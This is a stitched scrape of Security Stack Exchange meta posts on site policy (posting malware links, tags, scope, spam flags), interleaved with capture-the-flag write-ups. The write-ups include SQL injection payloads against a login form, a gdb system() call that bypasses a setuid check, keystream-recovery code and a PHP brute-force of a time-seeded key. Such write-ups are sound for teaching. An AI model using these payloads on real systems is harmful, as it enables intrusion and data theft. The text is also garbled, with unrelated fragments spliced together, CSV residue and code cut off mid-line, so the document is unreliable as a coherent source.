<p>My point is, most of those questions either: (a) should be asked on crypto, because it is about the algorithm details; or (b) mostly irrelevant which algorithm is used, from a security management point of view; or (c) apply to a range of algorithms, or the specific algorithm is not known in the question (e.g. which algorithm to use in a specific situation). </p>

</li>
<li><p>Ask yourself, am I putting people at risk?  For instance, including a clickable link to a known-malicious site is not a good idea, as people might accidentally click on it and get pwned.  If you really need to identify the site, you can still provide a URL without making it clickable.  Also, if you know that the link is malicious, provide a prominent warning next to it.</p>
</li>
<li><p>Ask yourself, am I making the question more useful to others, or less useful?  One of the purposes of this site is to create archival-quality answers to questions of broad interest.  (In other words, it's not just about helping you -- that's one goal, but another goal is to document answers that may help others.)  Posting a specific malware link/sample risks making your question a lot narrower in scope and more localized in time.  So, ask yourself: will posting the link increase the odds of getting general answers that will be broad utility to lots of other users, or will it have the effect of reducing the utility of answers by tending to make people focus in narrowly on a single malware sample?</p>
<p>Malware comes and goes.  I expect that in most cases, it is more helpful to generalize and ask the general question, rather than to post a question about a single malicious site/malware sample.  Thus, if you find yourself wanting/needing to post a malware link, that's a red flag that should trigger you to ask yourself whether your question might be too narrow and whether you can generalize your question.</p>
</li>
</ul>
<p>In general, I would be reluctant to post malicious links in most cases.  I certainly accept that there might be some situations where they are appropriate ... but I also expect that, for the reasons listed above, in most cases you won't need to post malicious links and indeed removing the malicious links may lead to a better question.</p>
<p><strong>Your specific post.</strong> I don't think you did anything <em>wrong</em> in the way you posted some malware links.  You <em>did</em> take steps to avoid putting people at risk, and that's laudable.  You did exactly what I would want people to do, if they were going to post malicious links.  And no, I don't think you violated any site policy or site rules, at least not as far as I know.</p>

Do not automatically expire single-use tags,"<p>By definition, a single-use tag is useless.<br>
(assuming it remains single-use for a long enough period of time, e.g. 6 months.)</p>

<p>The purpose of tags is similar to categorization, or rough groupings. That is to say, ""this question is loosely related to these other set of questions"".<br>
Obviously, this has several purposes - searching within a tag, following a tag, finding other questions that might have information regarding my question, etc.   </p>

<p>What purpose would a tag have, if there is only one question using it?<br>
To declare that This Question is Unlike all other questions....?</p>

<p>Sure, if another question pops up in the same subject, it would make sense to automagically discover this other question that is loosely related. But after 6 months (or however long), I think it's safe to say that it's not popping up so soon. If/when it does, it could make sense to search manually for other candidates for the renewed tag.    </p>

<p>But as it stands, I am very happy that some of the useless (by definition) tags are cleaned up automatically, it sure makes tag housecleaning easier. </p>

how does qotw author selection process takes place?,"<p>We recently changed how we do it - you can now vote for your QotW on a <a href=""https://security.meta.stackexchange.com/questions/1018/requests-for-question-of-the-week-blog-posts"">single post</a>, which saves the hassle of having hundreds of QOTW questions. Anyone can submit a QotW by posting an answer. Once the selection is complete (decided by votes) someone writes a blog post on it. Usually this mainly consists of quotes from the question and answers.</p>

<p>We usually decide who writes the blog post in the DMZ, which is easy for a small community like ours where people aren't fighting over who gets to write what. Usually someone volunteers to do it, and they go do it. It's a quick and simple process.</p>

Is asking a question about the legality and ethics of hacking back out of scope for this forum?,"<p>I don't think it would be too broad at all, however:    </p>

<p>Legality is always an issue on SE, they even closed the proposal - giving answering questions about legality can be construed as legal advice, which has legal standing of itself. Not to mention that it would depend greatly on location (complicated further since you are talking about more than one location - you might be in one country, your adversary in another - who has jurisdiction?)<br>
hus, unless it's very generic and high-level, a question about legality would be problematic, and thus closed (if it's just about legality). </p>

<p>As for ethics, this can be very subjective, which doesn't really lead to good answers. There is a subset of ethics that <em>can</em> be answered cleanly, though, it would still be tricky to focus that. (E.g. CISSP's Code of Ethics, or any other defined code.)</p>

<p>I think there is some wiggle-room on the above, but it is not much.<br>
For example, you could ask what laws or regulations would apply, depending on specific location. Or you could ask about the expected consequences. </p>
",<discussion><scope><black-hat>,7,,323
Is asking a question about the legality and ethics of hacking back out of scope for this forum?,"<p>In my opinion:</p>

<ol>
<li><p>You should separate legality from ethics.  Asking about both in the same question would be too broad.  Ask two questions, if you want to know both.</p></li>
<li><p>Asking about the ethics of hacking back is probably OK.  Please make sure to do some research of your own first (""do your homework"") and show what you came up with so far.</p></li>
<li><p>Asking about the legality of hacking back is probably not going to lead to a useful answer.  The short version is ""if you have authorization, it's probably legal; if you don't have authorization, it probably is illegal"" and for anything at all non-trivial, ""talk to a lawyer"".</p></li>
<li><p>The legality of hacking in general is fairly well-covered already by <a href=""https://security.stackexchange.com/q/6355/971"">At what point does &quot;hacking&quot; become illegal? (US)</a> so a question about legality would only be on-topic if it was clear what's different about this.  Also, questions about legality tend to be jurisdiction-specific, so you'd probably need to specify what country you are concerned with.</p></li>
<li><p>If you do ask about legality, do your homework first.  (Read, e.g., the blog posts on the Volokh Conspiracy about the legality of hacking back first before posting.)</p></li>
<li><p>Finally, I don't think the community on this site tends to have a great deal of legal expertise, so that kind of question might not get the kind of answers you are looking for, or might be closed because it just isn't a good fit for our community's interests and expertise.  Once it gets into anything at all non-trivial -- which ""hacking back"" probably is -- then I suspect the best we're likely to to be able to do is tell you to talk to your lawyer.</p></li>

Multiple PKI tags,"<p>While these tags do indeed have a lot in common, and there is indeed overlap, I think they focus on different aspects.    </p>

<p>Often someone would want to ask specifically about attributes of <a href=""https://security.stackexchange.com/questions/tagged/certificates"" class=""post-tag"" title=""show questions tagged &#39;certificates&#39;"" rel=""tag"">certificates</a>, or applicative use and storage, for e.g. asymmetric encryption (sans PKI).

<p>So yeah, they're definitely close and similar, and often you'd be using more than one (perhaps even as an incomplete subset of another), but I don't think they are identical, or close enough to merge.   </p>

<p>Btw, regarding ""certificate authority"" vs. ""certification authority"" - both Google and Bing return twice as many hits for the first than the second. Wikipedia has both registered on the same article, but has ""<a href=""http://en.wikipedia.org/w/index.php?title=Certification_authority&amp;redirect=no"" rel=""nofollow noreferrer"">certificate authority</a>"" as the canonical link. so, not quite conclusive, in either direction - but I would not be against a synonym from the 2nd to the 1st. </p>

<p>As a person who flagged it commented, ""This is a great question... to write a book on."" Aside from that, there isn't actually a <strong>security</strong> implication unless one of your persona's is upsetting mobsters, governments, etc. Providers widely vary in how they care: Twitter, for example, doesn't care how many accounts you spin up, or how many people use them. Facebook only wants you to have one account for yourself, but it isn't because of security. Then there's the question of your situation, and whether (and why) linking them might matter. I think you would simply have to be far more narrow.</p>

What kind of Bitcoin questions are on topic?,"<p>Bitcoin questions are on-topic if they are about security, especially with a professional bent. The existence of another Stack Exchange site about Bitcoin is not a critical element in making this determination. Similarly, questions about security of computer networks are on-topic here regardless of the existence of <a href=""https://serverfault.com/"">Server Fault</a>, questions about security of algorithms and their implementations are on-topic here regardless of <a href=""https://stackoverflow.com/"">Stack Overflow</a>, and so on.</p>

<p>Bitcoin questions are off-topic if there is no or very little security aspect to them. If we determine that a question about Bitcoin is off-topic here, but is otherwise a good Stack Exchange questions, the question can preferably be migrated to <a href=""https://bitcoin.stackexchange.com/"">Bitcoin Stack Exchange</a>.</p>

<p>If a question is firmly on-topic here, it should only be migrated with the asker's consent. If a question has already had good, on-topic answers here, it should not be migrated at all. If a question hasn't had any good answer yet, and either the asker requests or agrees to the migration, or the question is only marginally on-topic to begin with, then it is better to migrate the question. But migrations should not happen just because there is another site where the question is <em>also</em> on-topic, only because there is another site that is <em>significantly more suitable</em> for the question.</p>

<p>Let's look at <a href=""https://security.stackexchange.com/questions/26570/anonymity-through-paying-by-bitcoin"">your example question</a>:</p>

<ul>
<li>The question was firmly on-topic, being about the anonymity of a protocol.</li>
<li>It is only marginally on-topic on Bitcoin.SE, since it is about comparing a protocol using Bitcoin and protocols not using Bitcoin.</li>
<li>The asker had a Bitcoin.SE account, but chose to post here instead.</li>
<li>There was already a reasonable-looking on-site answer (by someone who had no Bitcoin.SE account).</li>

<p>Admittedly my Sec.SE stuff is from the perspective of a moderator, so I have this on my <a href=""http://www.linkedin.com/profile/view?id=3402893"" rel=""nofollow"">LinkedIn profile</a>:</p>

<blockquote>
  <p><strong>Moderator</strong> </p>
  
  <p>security.stackexchange.com January 2011 – Present (2 years 2
  months)</p>
  
  <p>I am one of four moderators of the global security
  question and answer site, which is part of the wider Stack Exchange
  family of Q&amp;A sites. I also administer the associated security blog at
  security.blogoverflow.com</p>
  
  <p>From August 2012, I have also moderated the Personal Productivity
  Stack Exchange site.</p>
</blockquote>

<p>But to be honest, the discussion is usually around what Sec.SE does, not really what the moderator role is. When I am interviewing individuals, I like to see things like member/contributor to OWASP/SE/ISACA/BCS/ISF etc as it gives me another avenue of discussion to delve into what someone is like - and then also gives me a chance to quickly look through some of the stuff the have answered (in the case of Sec.SE) and understand their approach and whether they will fit into my team.</p>

<p>In terms of guidance - you could summarise specialisations (in the form of your top tags, perhaps) but I wouldn't make it the core focus of a CV - ideally this should have work experience or research (or courses if you are a student or new graduate)</p>

How/Do you reference your work here on LinkedIn?,"<p>I agree completely with @RoryAlsop's answer. </p>

<p>However, I would also like to propose another solution - under ""Websites"", I have a link I labeled ""Portfolio"", which points to my <a href=""http://careers.stackoverflow.com/"">Careers 2.0</a> profile.   </p>

<p>The advantage of pointing to a Careers profile, instead of straight to Sec.SE, is that it allows me to highlight the posts any way I want, and also include posts from other sites (e.g. the <a href=""https://security.stackexchange.com/questions/tagged/security"" class=""post-tag"" title=""show questions tagged &#39;security&#39;"" rel=""tag"">security</a> tag on StackOverflow from before Sec.SE...).<br>
This really allows you to build a portfolio of your ""work"", since so much of what we do is not ""showable"" (even as much as code). 
As @Rory says, an interviewer can use it to get an idea of what I am like, and I can use Careers.SO to focus them on what I want them to focus on. </p>

Question about closing,"<p>As I stated in my comment there: </p>

<blockquote>
  <p>If you dont want to see ads from Google, don't use Google's free email service. This is a free service, funded by ads, not by the goodness of Google's hearts. The ""scanning"" that Google does is for the sole purpose of serving you ads. That is the price for using this free service. </p>
</blockquote>

<p>In other words, your question, as you posed it, does not make any real sense. (You use a free service, in exchange for agreeing to receive targeted ads. Your emails are ""scanned"" for the sole purpose of targeting these ads, and preventing this has no apparent security purpose.) You explicitly state that you are not interested in real encryption, and that you don't care if a Google employee manually accesses your email... Those would be legitimate security requirements. </p>

<p>Perhaps if you explained your purpose, if it is not apparent, it would make more sense.<br>
More likely, you are a victim of FUD - and are needlessly worried about this ""scanning"" you believe Google does to victimize it's free users.  </p>

Question about closing,"<blockquote>
  <p>I feel this is making us their search engine.</p>
</blockquote>

<p>Yeah, well, that and half the questions on Stack Exchange.</p>

<p>It's better to have a question with precise requirements than a question that is so vague that you can't answer anything useful.</p>

<p>Such questions should generally be closed as “not constructive” when the requirements are too vague. When the requirements are precise enough, these are worthwhile questions, but answers recommending a specific product are often not very good either because product choice tends to be down to personal preferences or habits. It's usually better to edit the question to make it less of a “catch this fish for me” and more of a “teach me how to fish”. Make the question ask what the important criteria are to select a product.</p>

<p>That being said, don't go too hard on questions that end up being product recommendations. Sometimes a recommendation from someone with more experience is exactly what you need. Answers like “I used X in a 1000-user shop, and it was good, but it couldn't handle the load when we increased past 10,000 users, so we tried Y and Z, and Y had better support from the vendor” are valuable.</p>

I am getting chat window in the stack overflow site i think this not belongs to stack overflow any idea?,"<p>Rory Alsop already explained the reason why.  He told you: ""what might be supported now might not be in 6 months; openssl.org is surely the right place to ask as they can notify when it changes"".  He also pointed you to the FAQ, where this is explained a bit further.  In my opinion, Rory did exactly the right thing; if he hadn't closed it, I imagine others in the community would have quickly done so.  I fully support him.</p>

<p>As a general comment: I think you might fare better on this site if you change your attitude a bit.  You are new to the site.  I notice that you've made a number of criticisms and accusations: e.g., that the site policy is unfair, the moderators are after you personally, that people are just using you for entertainment, all sorts of stuff.  I think you need to spend some time learning how to use the site the way it is intended to be used, and learning about why the rules are set up the way they are, before you will be able to form an informed opinion about the site.</p>

<p>Also: this site is not here to help you, personally, out.  Rather, it is intended as a public good.  I realize it may not be right for everyone.  (This might sound harsh, but it's not meant that way.)  Many of us find the site is extremely valuable for us, and we want to keep it that.  We realize that there tend to be good reasons why many of the rules are the way they are; in many cases, they are based upon direct personal experience.  If you find the site is not valuable for you, then maybe this is not the right site for you.</p>

<p>I'm certainly not saying nothing here can be improved, or that your feedback is unwelcome -- but I am saying it might help to first understand the culture and norms here before you start critiquing it.  And, I am saying you should try to be nice to others here: they are not out to get you, they are trying to help and to ensure the site remains a helpful resource to others.  Start from the assumption that everyone is acting in good faith and has good reasons for why they are behaving how they are, and you might find the interactions start to become a bit more pleasant for you.

It's just too dark as it is - however, if you have a look at the <em>meta</em> user profile that is a lot nicer - a faint silvery background more in keeping with the design of SO, math.SE, the beta theme etc.</p>

Bullet points and external links in tag wikis?,"<p>I've rejected a number of your tag edits recently, for various reasons, including:</p>

<ul>
<li>Unnecessary bullet points.</li>
<li>Poor quality / missing description of what the tag is about.</li>
<li>Not concise enough.</li>
</ul>

<p>Here are my reasons:</p>

<p><strong>Bullet points</strong><br />
Bullet points in tags are <em>rarely</em> necessary for tags, outside of the full tag wiki. They look bad in the popout, and should only be used if you're listing things. There's no reason to use them to format your entire entry. Instead, use proper paragraphs.</p>

<p><strong>Poor quality / missing description</strong><br />
Tag summaries are meant to concisely explain <em>what</em> a term means, and in the case of potentially ambiguous terms, when they should be used. In some cases, you neglected to mention what the tag actually meant at all. In others, you only half explained it and added needless cruft to bulk out the entry.</p>

<p><strong>Not concise enough</strong><br />
The tag wiki guideline says the following:</p>

<blockquote>
  <p>The tag wiki excerpt is a brief plain text introduction to the topic that the tag represents. It is shown at the top of tag question lists, and as a tooltip wherever the tag appears. Complete this first! </p>
</blockquote>

<p>Some of your edits went into detail about tools, different types of attack / recon, detail around projects involved in the subject, etc. This is just too much for an excerpt. It should contain a simple, short explanation of what the term means, and what the tag should be used for if there is any confusion. Adding links to projects and other such formatting is useless in the excerpt, and often leads to link-rot in the full tag wiki.</p>

<hr>

<p>All in all, I rejected or heavily edited 5 of the 7 tags edits I reviewed, due to problems such as the above.</p>

<p>I applaud your efforts to improve our tags, because it's an area that many people don't focus in, but making poor quality edits often results in more work for reviewers. If you stick to the tag guidelines and keep things short and sweet, without unnecessary formatting, your tag edits would be much more likely to be accepted.</p>

How to make my 'robots.txt for face' question more focused and answerable?,"<p>The problem is that your question asks about ways to do something that currently don't exist. Google is one of those at the forefront of research in this area, but simply put, the question you have asked is likely to be technically unanswerable for some time, and the legal aspects are entirely off topic here.</p>

<p>Your final line is also not going to fit here:</p>

<blockquote>
  <p>Are there any other ongoing technical, legal or social attempts to address this conflict?</p>

<p>Have a read of the [faq] and see if there is something in your question which could fit here. I have closed your question for now.</p>

<h2>Problem 16: secure_reader [Pwnable]</h2>

<p>The flag is in <code>/home/securereader/flag</code>. Only the <code>securereader</code> user can read it.</p>

<p>The program <code>/home/securereader/secure_reader</code> is setuid <code>securereader</code>. Let's try calling it:</p>

<pre><code>$ /home/securereader/secure_reader /home/securereader/flag
This may only be called by /home/securereader/reader
$ /home/securereader/reader /home/securereader/flag
File is not in a whitelisted directory!
</code></pre>

<p><code>strings /home/securereader/reader</code> shows <code>/tmp/</code> as a directory (and others that are unlikely to matter as they are from libc components). Lookie here, <code>/tmp/flag</code> has the same date, size and permissions as <code>/home/securereader/flag</code>!</p>

<pre><code>$ /home/securereader/reader /home/securereader/flag
This may only be called by /home/securereader/reader
</code></pre>

<p>Odd. A trace reveals that <code>secure_reader</code>'s parent is <code>/bin/dash</code>, instead of <code>reader</code> as intended. Break out a copy of Gdb:</p>

<pre><code>$ gdb /home/securereader/reader
(gdb) b main
(gdb) r
(gdb) call system(""exec /home/securereader/secure_reader /tmp/flag"")

Spam in Q&A - Any advised handling protocol?,"<p>Here's the part from <a href=""https://meta.stackexchange.com/questions/58032/how-does-the-spam-flag-work"">the relevant Meta.SO answer</a></p>
<h2>What is the effect of the <em>Spam</em> flag?</h2>
<p>This type of flag receives an extremely high priority in the moderation queue. It should be used only when the content of the post you are flagging meets the criteria defined below, or it will likely be declined.</p>
<p>The spam flag is designed to eliminate posts with no relevant content and to penalize the authors:</p>
<ul>
<li>3 flags (spam or offensive): post is banished from the front page.</li>
<li>6 flags (spam or offensive): post is <a href=""https://meta.stackexchange.com/questions/22228/what-is-a-locked-post"">locked</a>, deleted, and the first revision owner loses 100 reputation.</li>
<li>1 flag from a moderator has the same effect as 6 flags from normal users: instant destruction.</li>
<li>Because a question with 6 flags is locked, a 10k reputation user cannot meaningfully undelete it.</li>
<li>Each spam flag counts as a downvote for calculating the post's score <em>(it does not affect the user's reputation)</em>.</li>
</ul>
<h2>Is there any way to remove <em>Spam</em> flags?</h2>
<p>There is often no need, as spam flags expire after 48 hours if the thresholds aren't reached.</p>
<p>Rolling back a post to a previous state will revert to the number of spam flags from that particular revision.  This allows the OP (or someone else with edit rights) to rollback a post that someone else made spam in a later revision.  However, as a general user, once you mark a post as spam, you cannot take it back.</p>
<h2>How does the <em>Spam</em> flag differ from the <em>Offensive</em> flag?</h2>
<p>There is no functional difference aside from separate counts - 3/6 of either will be sufficient for mechanical purposes.</p>
<hr />
<p>Personally, this is what I usually do:</p>
<ol>
<li>Flag as SPAM.</li>
<li>Edit out the spammy part.</li>
<li>A mod eventually will come and look at it and check the user.</li>

How do we feel about edits correcting an OP's misconception?,"<p>My opinion is that if the OP thought that MAC addresses are part of HTTP or called a key exchange protocol an encryption protocol then there must be other people thinking the same, and the correct way to handle this is with comments and answers.</p>

<p>Next time someone finds the question on Google and clicks on it, they'd see that they had a misconception and reading the answers would rectify the situation.</p>

<p>Editing out the misconception, however, teaches the OP nothing. Even worse, it makes it harder for the answerers to truly answer the question. Anything they say might sound confusing to the OP because the initial misconception hasn't been cleared.</p>

How do we feel about edits correcting an OP's misconception?,"<p>The Sec.SE team did a poor but oddly appropriate showing at #69.</p>

<h2>CRY100: Espionage</h2>

<p>We get two encrypted files, a decryption program, and the password for one of the files. The plaintext for the file we can decrypt is formatted like an email, which suggests that the other may be too. It's likely that the second file begins with <code>From: Vlugge Japie &lt;vl.japie@yahoo.com&gt;</code> or with <code>From: Baron van Neemweggen &lt;b.neemweggen@zmail.com&gt;</code>.</p>

<p>The encryption algorithm is a stream cipher. The keystream is derived from the password as follows:</p>

<ul>
<li>Apply some function <code>h</code> to the password 20000 times to get the first 16 bytes of keystream.</li>
<li>Given a chunk <code>k</code> of keystream, the next chunk is <code>h(k || s)</code> where <code>s</code> is some constant string (the length of the message in decimal).</li>
</ul>

<p>Oh, look: each chunk of keystream only depends on the previous chunk! So if we can guess one chunk, we can decrypt the message starting at that chunk. Earlier we saw that we had a good guess for the first chunk, so let's plug it in. We can reuse the supplied Python code, just remove the initial key generation step from the <code>crypt</code> function.</p>

<pre><code>#!/usr/bin/python2
import hashlib, string, sys
def xor(a, b):
    l = min(len(a), len(b))
    return ''.join([chr(ord(x) ^ ord(y)) for x, y in zip(a[:l], b[:l])])
def h(x):
    x = hashlib.sha256(x).digest()
    x = xor(x[:16], x[16:])
    return x
def crypt0(msg, k):
    out = ''
    for i in xrange(0, len(msg), 16):
        out += xor(msg[i:i+16], k)
        k = h(k + str(len(msg)))
    return out

ciphertext = open('msg002.enc').read().decode('base64')
print crypt0(ciphertext, xor(ciphertext[:16], 'From: Vlugge Jap'))
print crypt0(ciphertext, xor(ciphertext[:16], 'From: Baron van '))

<p>Running the executable yields a dice game interface, where the user presses return to throw the dice. The value rolled is randomly generated 1-6.

<p>So the first stage was just a case of firing up Immunity and pausing the execution at the first dice roll. Stepping through the program quite quickly showed the call to <code>rand()</code> that was being used to generate the rolls.</p>

<p><img src=""https://i.stack.imgur.com/E0yWr.jpg"" alt=""Immunity with freehand circles""></p>

<p>Unfortunately, due to what I thought at the time was loop-unrolling, the 5 calls to <code>rand()</code> appear separately, so I had to repeat the process above for each roll offset.</p>

<p>And this is where I started wasting time. I assumed that I had not 'synthesized' the dice rolls in exactly the way that was required.

<p>The first thing I did was track down the branch that was taking me to the 'something wrong' message, and patched it to reverse its decision.</p>

<p>This resulted in me getting the success message, but a garbled flag. So the 'something wrong' message was right - somehow the flag generation hadn't happened as it should.</p>

"Newbies can answer, but not comment, what's a SME to do?","<p>New users can:</p>

<ul>
<li>Post an answer to provide information that answers the question.</li>
<li>Edit an answer to add a little information or correct a minor mistake.</li>
<li>Ask a new question if they want explanations about an answer.</li>
</ul>

<p>That covers a vast majority of cases. In the rare cases where a comment would really be the right thing, there is a way to sneak it in: moderators can convert an answer to a comment.</p>

<p>In this case, Syncovery posted an answer which was converted to a comment by a moderator. There is no problem to solve here, the solution already exists and was applied.</p>

<p>Allowing users one comment would open the spam floodgates — spammers would create one account at a time, as they do now. Answers bump a thread to the front page, so spam is quickly spotted and eliminated; it would not be so with comment. That isn't the biggest problem with not allowing comments from new users though. Stack Exchange is a questions and answers site. That's something people who are new to SE often don't understand, because it differs significantly from the usual discussion interfaces. New users are forced to start with what constitutes the meat of the site: questions and answers. That gives them a bit of time to get used to how we do things.</p>

<hr>

<p>In this specific case, I think it would actually have made sense to keep the answer, and edit it to be self-standing rather than replying to bobince:</p>

<blockquote>
  <p>This is due to a bug in Syncovery. Thanks for the report, it will be fixed in the next update.</p>

<p>Users have the right and ability to remain anonymous on Stack Exchange (insofar as online anonymity can be achieved). Stack Exchange doesn't want to get into the business of verifying identities.</p>

<p>If you want to link your Stack Exchange account with some other web identity, you'll have to do it a different way. For example, write a page on your own site that claims that you are a particular Stack Exchange user, and prove your ownership by using an email address on your site's domain (which nobody else would think to use). If you use Gravatar as your user picture provider, the link to your picture includes a hash (MD5) of your email address.</p>

<p><strong>Solved jointly by randomdude and Manishearth, <a href=""http://labit.in/eng.php?id=1073"" rel=""nofollow noreferrer"">independently by p____h (while not on the team)</a></strong></p>
<p>The title was a pun on their prior announcement that &quot;<a href=""https://legitbs.net/"" rel=""nofollow noreferrer"">Web stuff won’t just be simple baby’s first SQLi this time</a>.&quot;</p>
<p>I found this one interesting, because I've never dealt with SQLite till now. The injection we had discovered only allowed queries that returned 1x1 tables, and we had to work within that constraint.</p>
<p>From the outset, this one was a simple web form with a username and passwords field:</p>
<p><img src=""https://i.stack.imgur.com/gS5Ck.png"" alt=""enter image description here"" /></p>
<p>Initially, all login attempts failed. However, I noticed an interesting tidbit, the response headers of a failed login had an <code>X-Sql</code> header, which showed the exact SQL query being run (e.g. <code>X-Sql: select name from users where name = 'manish' and password = 'abcd' limit 1;</code>). This was useful, because now I knew the table and column name.</p>
<p>After a bit more experimentation, it was easy to get an injection:</p>
<pre><code>Username: root'/*
Password: */ or 1='1
</code></pre>
<p>which ran the query <code>select name from users where name = 'root'/*' and password = '*/ or 1='1' limit 1;</code></p>
<p>This gave <a href=""https://i.stack.imgur.com/zT0il.png"" rel=""nofollow noreferrer"">a success message</a>, but that's all. Furthermore, it only worked for <code>root</code>. (Later on we learned that it would also work for <code>user</code>)</p>
<p>Now, the only way for us to get the output of an sql query was to disguise it as the query of the users table, since the success message seemed to pull the username from the database.</p>
<p>@randomdude got there first (I was too busy wasting time with JOIN) with a UNION query</p>
<pre><code>Username: aaa'/* 
Password: */ union select password from users as name union select name from users where 1=2 or 1='1
</code></pre>
<p>It turned out that the password was <a href=""https://i.stack.imgur.com/Sp3Yb.png"" rel=""nofollow noreferrer"">&quot;barking up the wrong tree&quot;</a>. Hmph.</p>
<p>(Using a <code>Count(*)</code> query we also discovered that there was a second entry in the table, a user &quot;user&quot; and password &quot;password&quot;)
So now we had to broaden our search. For that, we first needed database reflection. Trial-and-error would have worked (in retrospect), but it would be better if we could use reflection to determine the schema and then scoured it for the key.</p>
<p>Since each type of SQL is different especially when it comes to built in functions and reflection, we had to determine the database type.</p>
<p>Using the same user as above, and using the password <code>*/ union select sqlite_version() as name union select name from users where 1=2 or 1='1</code>, (after trying every other type of SQL under the sun), I was surprised to find out that it was SQLite (3.7.9) .</p>
<p>We first tried PRAGMA commands. However, unlike most commands in SQL which return table values, SQLite PRAGMA commands return a string. Now, in a single-column SELECT command (the format our injection was restricted to),  to get the value of a string <em>function</em> (function, not SQL command), we can run <code>SELECT func()</code>. Similarly, to get the value of a table-formatted SQL command, we can run <code>SELECT columnname FROM (SQL COMMAND)</code>.</p>
<p>However, the PRAGMA commands would give syntax errors if stuffed in on either side.</p>
<p>Fortunately, @randomdude remembered that there is a database <code>sqlite_master</code> in SQLite, quite similar to <code>information_schema</code> with respect to the data it contains.</p>
<p>Using the password <code>*/ union select sql from sqlite_master where type='table' union select name from users where 1=2 or 1='1</code>, we got that there was also a table <code>keys</code>, with a single column <code>value</code> (If this was not the first table in the database, an ORDER BY clause or a WHERE clause would have sufficed to bring it out). So, using the password <code>*/ union select value from keys  union select name from users where 1=2 or 1='1</code>, we got the string <code>The key is: literally online lolling on line WucGesJi</code></p>

<p>Web 3 was a login/create account form. After logging in, you could see a list of &quot;secrets&quot; and the users they belonged to, but not the contents of the secrets.

<p>The goal here was to log in as &quot;admin&quot; and see the secret &quot;key&quot; belonging to admin. However, the web form wasn't letting users log in as admin.</p>
<p>Worsemedicine was similar; you could log in as anybody except admin.</p>

<p><a href=""http://rememberme.shallweplayaga.me/"" rel=""nofollow noreferrer"">http://rememberme.shallweplayaga.me/</a></p>
<p><strong>Solved jointly by p____h and Manishearth. Mainly by p___h</strong></p>
<p>Here, there was a link to a login form, as well as a link to <a href=""http://rememberme.shallweplayaga.me/getfile.php?filename=usernames.txt&amp;accesscode=60635c6862d44e8ac17dc5e144c66539"" rel=""nofollow noreferrer"">usernames.txt</a> and <a href=""http://rememberme.shallweplayaga.me/getfile.php?filename=passwords.txt&amp;accesscode=60635c6862d44e8ac17dc5e144c66539"" rel=""nofollow noreferrer"">passwords.txt</a>. Both were fetched by <code>getfile.php</code>, which had two GET parameters: a <code>filename</code>, and an <code>accesscode</code>, which seemed to be a 128-bit hash. The given URLs opened username.txt (a list of usernames), but gave an &quot;Invalid access code&quot; error for passwords.txt.</p>
<p>@p____h discovered that the <code>accesscode</code> was simply the md5 of the <code>filename</code>, giving the following password file: <a href=""http://rememberme.shallweplayaga.me/getfile.php?filename=passwords.txt&amp;accesscode=b55dcb609a2ee6ea10518b5fd88c610e"" rel=""nofollow noreferrer"">http://rememberme.shallweplayaga.me/getfile.php?filename=passwords.txt&amp;accesscode=b55dcb609a2ee6ea10518b5fd88c610e</a></p>
<p>This was a basic Unix <code>/etc/passwd</code> file, which would be a pain to decrypt. However, it was a red herring and the login form was irrelevant to the challenge (in fact, we would later discover that it was rigged to ignore all requests)</p>
<p>@p____h tried to ask getfile.php to read itself, and <a href=""http://rememberme.shallweplayaga.me/getfile.php?filename=getfile.php&amp;accesscode=0701593e23e676eaba834916a6ac7272"" rel=""nofollow noreferrer"">it obliged</a>. Here are the contents:</p>
<pre><code>$value = time();
$filename = $_GET[&quot;filename&quot;];
$accesscode = $_GET[&quot;accesscode&quot;];
if (md5($filename) == $accesscode){
echo &quot;Acces granted to $filename!

&quot;;
srand($value);
if (in_array($filename, array('getfile.php', 'index.html', 'key.txt', 'login.php', 'passwords.txt', 'usernames.txt'))==TRUE){
$data = file_get_contents($filename);
if ($data !== FALSE) {
if ($filename == &quot;key.txt&quot;) {
$key = rand();
$cyphertext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $data, MCRYPT_MODE_CBC);
echo base64_encode($cyphertext);
}
else{
echo nl2br($data);
}

}
else{
echo &quot;File does not exist&quot;;
}
}
else{
echo &quot;File does not exist&quot;;
}

}
else{
echo &quot;Invalid access code&quot;;
}
?&gt;

<p>So <code>getfile.php</code> would directly display the contents of a set of file. However, it would encrypt the contents of <code>key.txt before displaying</code>. And sure enough, <a href=""http://rememberme.shallweplayaga.me/getfile.php?filename=key.txt&amp;accesscode=65c2a527098e1f7747eec58e1925b453"" rel=""nofollow noreferrer"">key.txt contained a base64 encoded string that would change on refresh</a>.</p>
<p>The encryption algorithm was quite simple:</p>
<pre><code>srand(time()) //Set the random number generator seed to the current time, in seconds
$cyphertext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, rand(), $data, MCRYPT_MODE_CBC);
echo base64_encode($cyphertext);
</code></pre>
<p>To decrypt it, we would simply have to run</p>
<pre><code>srand(time());
mcrypt_decrypt(MCRYPT_RIJNDAEL_128, rand(), base64_decode($keyfile), MCRYPT_MODE_CBC);
</code></pre>
<p>At the correct time. Since <code>time()</code> changes every second, the easiest thing to do would be to get the key value and loop through a small neighborhood of the current value of <code>time()</code>. (The small neighborhood needs to be on both sides, because one cannot be sure of synchronization between the two clocks)</p>
<p>I cooked up the following code:</p>
<pre><code>&lt;?php
error_reporting(0)
$c=base64_decode($argv[1]);
$a=time();
for($i=$a-200;$i&lt;$a+200;$i++){
  srand($i);
  echo &quot;\n&quot;.$i.&quot;) &quot;. mcrypt_decrypt(MCRYPT_RIJNDAEL_128, rand(), $c, MCRYPT_MODE_CBC);

"Newbies can answer, but not comment, what's a SME to do?","<p><strong><h2>Guerilla Programming 2 (Die Hard)</h2></strong></p>

<p>This challenge was an exercise in TCP sockets client programming and finding optimum pouring solution for two random size buckets so the amount of water in one would fit the required weight of water (also random) that was inscribed on the scale.</p>

<p>Fire up your favorite terminal and open: <code>diehard.shallweplayaga.me:4001</code></p>

<p><strong>The script</strong>:</p>

<p>Our protagonist finds himself in a bit of a trouble. He needs to complete several stages of challenges, most of them while the world around him is collapsing. First up is actually finding challenges in the virtual world, by navigating in four directions (<code>N</code>, <code>E</code>, <code>S</code>, <code>W</code>). After entering the first challenge room, our character is presented with two buckets of different sizes, and a scale, on which you have to drop one of properly filled buckets to match the scale requirement and open the door to the new challenge. This initial challenge isn't timed, while all the subsequent are. After some manual testing in Putty (in raw mode), we've extracted the initial solution that never changes and can be hard-coded into the client software, but the latter challenges obviously needed to be scripted. No human could complete them in time, and it turns out even computer programs would have problems to...</p>

<p>&nbsp;&nbsp;&nbsp;<img src=""https://i.stack.imgur.com/v2yXw.png"" alt=""Die Hard""></p>

<p><strong>Damn sockets</strong>:</p>

